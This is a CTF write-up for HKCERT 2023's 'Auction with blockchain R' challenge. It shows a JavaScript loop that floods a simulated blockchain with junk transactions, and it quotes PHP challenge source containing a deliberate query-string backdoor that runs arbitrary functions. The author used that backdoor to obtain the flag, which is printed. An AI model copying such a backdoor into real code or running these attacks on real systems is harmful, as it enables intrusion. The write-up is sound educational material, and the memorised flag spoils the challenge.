# Auction with blockchain \(R\) (200 point, 2 solves, ★★☆☆☆) [First blood 🩸]
---
Solved by: Kaiziron
Team: O0159 - Black Bacon


### Description :
```
It is EIP-1559 era now, can you still perform the "Block Stuffing Attack" efficiently? ... or not?

Web: http://chal-a.hkcert23.pwnable.hk:28306 , http://chal-b.hkcert23.pwnable.hk:28306
```
---
### Solution : 

Although the description mentioned EIP-1559, the simulated blockchain in the challenge is quite simple and has nothing related to it, it is just a distraction

The challenge looks identical to last year's blockchain auction challenge

![](https://i.imgur.com/9n1Y8dX.png)

No bidders will bid for garlic chives, but they will bid for CTF Flag. There will be at least one whale who have more AKA tokens than our wallet and place a higher bid than we can for CTF Flag and win the flag

Last year, I solved this challenge with block stuffing to use up all space of a block by spamming junk transactions after my first bid, so other bidders can't have their transactions included in a block before the auction end

I tried my solution for last year in this year's challenge, and it works

```js
count = 1
bidValue = 1
async function junk() {
    n = 2
    gas = 4
    a = parseInt(Math.max(0,bidValue)).toString(16).padStart(4,"0");
    txdata.value = u.innerText+String(n).padStart(4,"0")+a;
    nonce.value = Array.from(crypto.getRandomValues(new Uint8Array(16))).map(b=>b.toString(16).padStart(2,"0")).join("");
    metumusk.style.display = "block";
    alldata.value = String(txdata.value) + String(gas).padStart(4,"0") + String(nonce.value);
    signature.value = await digestMessage(alldata.value);
    alldatas.value = String(alldata.value) + String(signature.value);

    sendtx()
    console.log(bidValue, count)
    count += 1
}
setInterval(junk, 200)
```

![](https://i.imgur.com/ThsqNgK.png)

But it gives last year's flag, so I'm thinking if they deployed the wrong challenge


Then I opened a ticket and ask about it, but they replied that it's intended

![](https://i.imgur.com/RE1DbPN.png)

Last year, we do not know about the course of this challenge and we have no idea what's actually going on in the backend of this simulated blockchain

This year, the source is also not given. But last year's challenges are all in the hkcert-ctf-2022-cahllenges github repo, and I found the source of it. So I tried to understand the code and see if there's anything changed this year

But then I noticed this weird looking line of code :


https://github.com/blackb6a/hkcert-ctf-2022-challenges/blob/main/18-auction-blockchain/env/abc/src/index.php#L87

```php
    if($info["time"] >= 180){
        if($info["items"][1]["top_bid"] == 0){
            $egmsg .= "No one won the Garlic Chives.\n";
        }else{
            $egmsg .= "0x".$info["items"][1]["top_bidder"]."... won the Garlic Chives with bid ".$info["items"][1]["top_bid"].".\n";
            if($info["items"][1]["top_bidder"] == substr($_SESSION["user"],0,16)){
                $egmsg .= "You got a useless NFT. You were harvested by crypto-farmers.\n";
                $_GET["info"]?$_GET["info"]($_GET[$_GET["info"]]):$_GET["info"];
            }
        }
        $egmsg .= "0x".$info["items"][2]["top_bidder"]."... won the CTF Flag with bid ".$info["items"][2]["top_bid"].".\n";
        if($info["items"][2]["top_bidder"] == substr($_SESSION["user"],0,16)){ //yeah it looks buggy but who cares...
            $egmsg .= "You got an NFT going to the MOON! And here is your reward:\n";
            include_once("flag.php");
            $egmsg .= $flag;
        }
    }
    $info["endgame"] = $egmsg;
```

There is a backdoor if we win the auction for the useless NFT :
```php
$_GET["info"]?$_GET["info"]($_GET[$_GET["info"]]):$_GET["info"];
```

So, just bid on the useless NFT and wait for the auction end, as all other bidders are bidding for the 2022 CTF flag, there is no one bidding for the useless NFT. Then just exploit the backdoor to get the flag

![](https://i.imgur.com/jILIW1C.png)

![](https://i.imgur.com/HsaQa9y.png)

### Flag :

```
hkcert23{how2StuffChivesAttack_JustPay1nEther_0rn0t}
```
